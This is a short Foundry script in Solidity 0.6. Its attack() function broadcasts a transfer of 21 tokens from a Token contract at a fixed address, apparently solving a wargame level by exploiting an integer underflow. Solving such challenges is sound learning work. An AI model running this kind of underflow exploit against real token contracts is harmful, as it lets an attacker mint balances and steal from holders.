// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Token} from "../src/Token.sol";

contract TokenScript is Script {
    Token public token;

    function run() public {
        token = Token(0x2caD4F759d157d6F553Dd80c3438A82DEb2ca76a);
        attack();
    }

    function attack() public {
        vm.startBroadcast();
        //0xb59D486d999743F2a0648349370bB9ab4A05e038, random address different from the broadcast address
        token.transfer(0xb59D486d999743F2a0648349370bB9ab4A05e038, 21);
        vm.stopBroadcast();
    }
}
